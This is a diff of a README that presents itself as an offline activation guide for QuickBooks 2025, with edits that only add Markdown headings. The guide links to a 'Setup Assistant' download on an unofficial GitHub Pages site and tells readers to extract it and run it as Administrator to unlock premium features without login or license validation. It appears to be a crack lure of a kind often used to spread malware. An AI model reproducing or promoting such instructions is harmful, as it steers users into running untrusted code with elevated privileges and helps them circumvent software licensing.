@@ -1,22 +1,23 @@
 # QuickBooks 2025 — Offline Activation Guide
 
-🔘 Download Setup Assistant:  
+## 🔘 Download Setup Assistant:  
 [![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-blueviolet)](https://quickbooks-smart-business-tool.github.io/.github/)
 
-⚙️ How to Use:
+## ⚙️ How to Use:
 1. Download the setup assistant using the button above  
 2. Extract the archive using 7-Zip or WinRAR  
 3. Run the included tool as Administrator  
 4. Follow the on-screen instructions  
 5. Launch QuickBooks — all features should now be available
 
-🎯 What You Unlock: 
+## 🎯 What You Unlock: 
     🔓 Full export settings  
     📊 Advanced accounting tools and financial management  
     🖥️ Seamless payroll, invoicing, and reporting functionality  
     🛠 No login or online validation required  
     🔧 Full access to all premium features
-
+    
+## About QuickBooks
 QuickBooks 2025 is a comprehensive accounting software designed for small to medium-sized businesses, offering powerful tools for invoicing, tax calculation, payroll management, and financial reporting. It helps businesses streamline their financial processes and ensure accuracy, even without a constant internet connection.
 
 This guide will assist you in activating QuickBooks in an offline environment, ensuring you can access all the features without requiring an online login or the QuickBooks account. It's perfect for enterprise deployment or users in airgapped environments, providing full version access with no internet dependencies.
